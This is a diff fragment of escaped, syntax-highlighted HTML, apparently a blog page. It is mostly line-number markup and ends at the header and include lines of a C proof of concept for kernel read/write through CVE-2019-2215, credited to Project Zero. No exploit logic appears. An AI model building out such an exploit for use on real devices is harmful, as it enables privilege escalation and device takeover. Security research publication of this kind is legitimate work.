+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 65
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 66
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 67
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 68
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 69
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 70
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 71
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 72
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 73
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 74
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 75
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 76
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 77
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 78
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 79
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 80
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 81
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 82
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 83
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 84
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 85
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 86
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 87
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 88
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 89
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 90
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 91
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 92
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 93
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 94
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 95
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 96
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 97
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 98
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 99
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;100
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;101
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;102
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;103
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;104
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;105
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;106
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;107
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;108
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;109
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;110
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;111
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;112
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;113
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;114
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;115
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;116
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;117
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;118
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;119
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;120
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;121
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;122
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;123
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;124
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;125
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;126
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;127
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;128
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;129
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;130
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;131
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;132
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;133
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;134
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;135
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;136
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;137
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;138
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;139
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;140
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;141
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;142
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;143
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;144
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;145
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;146
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;147
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;148
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;149
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;150
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;151
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;152
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;153
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;154
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;155
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;156
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;157
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;158
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;159
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;160
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;161
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;162
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;163
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;164
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;165
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;166
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;167
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;168
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;169
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;170
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;171
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;172
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;173
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;174
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;175
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;176
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;177
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;178
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;179
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;180
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;181
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;182
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;183
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;184
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;185
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;186
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;187
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;188
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;189
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;190
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;191
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;192
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;193
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;194
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;195
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;196
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;197
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;198
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;199
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;200
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;201
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;202
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;203
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;204
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;205
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;206
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;207
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;208
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;209
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;210
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;211
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;212
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;213
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;214
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;215
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;216
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;217
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;218
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;219
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;220
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;221
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;222
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;223
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;224
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;225
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;226
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;227
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;228
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;229
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;230
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;231
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;232
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;233
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;234
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;235
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;236
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;237
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;238
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;239
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;240
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;241
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;242
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;243
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;244
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;245
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;246
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;247
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * POC to gain arbitrary kernel R/W access using CVE-2019-2215
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Jann Horn &amp;amp; Maddie Stone of Google Project Zero
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * 3 October 2019
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;*/&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#define _GNU_SOURCE
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdbool.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/wait.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;ctype.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/uio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;err.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sched.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/epoll.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/ioctl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;linux/sched.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
